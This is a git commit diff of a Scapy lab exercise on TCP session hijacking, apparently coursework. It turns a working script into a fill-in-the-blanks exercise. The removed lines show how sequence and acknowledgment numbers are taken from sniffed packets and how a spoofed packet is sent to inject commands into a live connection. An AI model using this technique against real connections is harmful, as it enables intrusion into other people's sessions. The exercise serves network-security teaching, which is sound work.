f92d03afce6c4f7c54784b8fb61105da83b91d07
DeborohNoah <cesarettiandreaeugenio@gmail.com>
2026-04-28 08:25:11 +0200

    Last minute edit :D

--- tcp_exercise3.py
+++ tcp_exercise3.py
@@ -19,6 +19,8 @@ def stop_sniff(pkt):
 def show_pkt(pkt):
     global seq, ack, sport, dport, hijacked
 
+    # Ex1: Which packet should the script wait for? What
+    # parameters can you use to filter out non useful packets?
     if pkt[TCP].flags != 'A':
         return
 
@@ -28,28 +30,35 @@ def show_pkt(pkt):
     if pkt[TCP].sport != 1234:
         return
 
-    seq = pkt[TCP].ack
-    ack = pkt[TCP].seq
-    sport = pkt[TCP].dport
-
+    # Ex2: how can you get the necessary informations for
+    # the attack (hint: check exercise 2 if you don't remember
+    # the syntax
+    seq = ...
+    ack = ...
+    sport = ...
+    
     send_spoof_tcp(b"\n!!! Connection Hijacked !!!\n\r")
     hijacked=True
 
 def send_spoof_tcp(command):
     global seq, ack, sport, dport, hijacked
 
-    # Exercise 1.
-    # Fill the and IP, TCP layers accordingly to the algorithm we discussed
-    # Tip 1: How should the flag field be?
-    ip = IP(src=src, dst=dst)
-    tcp = TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags='PA')
+    # Exercise 3.
+    # Build the packet with the necessary informations 
+    # and then send it!
+    # hint: be careful of the tcp flags, which ones should you use?
+
+    ip = IP(...)
+    tcp = TCP(sport=..., dport=..., seq=..., ack=..., flags='PA')
     data = command
-    pkt = sr1(ip / tcp / data, verbose=False)
+    pkt = sr1(..., verbose=False)
     seq = pkt[TCP].ack
 
+    # Wait for the acknowledgment from the server
     if pkt[TCP].flags == "A":
-        ack = pkt[TCP].seq
-        seq = pkt[TCP].ack
+        # Ex4: Should these fields be updated?
+        ack = ...
+        seq = ..
 
 def command_inject():
     while True:
@@ -67,7 +76,7 @@ def command_inject():
 
 if __name__ == "__main__":
     print("----------------------")
-    sniff(filter="tcp",
+    sniff(filter="tcp",     # You can modify this filter as you please
       iface="eth0",
       prn=show_pkt,
       stop_filter=stop_sniff
